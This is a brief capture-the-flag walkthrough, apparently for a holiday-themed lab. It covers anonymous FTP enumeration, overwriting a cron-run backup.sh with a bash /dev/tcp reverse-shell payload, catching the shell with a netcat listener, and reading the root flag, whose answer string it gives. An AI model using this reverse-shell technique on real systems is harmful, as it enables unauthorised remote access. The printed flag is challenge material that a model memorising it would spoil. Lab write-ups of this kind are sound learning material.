***Name the directory on the FTP server that has data accessible by the "anonymous" user***  
Login FTP, list folder and file with `ls`. Just `public` is have capacity. Answer `public`  

***What script gets executed within this directory?***  
Enumerate `public` folder. Answer `backup.sh`  

***What movie did Santa have on his Christmas shopping list?***  
Read shopping-list in `public`. Answer `The Polar Express`  

***Output the contents of /root/flag.txt!***  
As instruction, The script run every minute, i create the new `backup.sh` with payload `sh -i >& /dev/tcp/IP/PORT 0>&1` and re-upload to `public`  
At my machine, i run `nc -nvlp PORT` and wait connection from victim. After minute, I get reverse shell and cat flag. Answer `THM{even_you_can_be_santa}`  
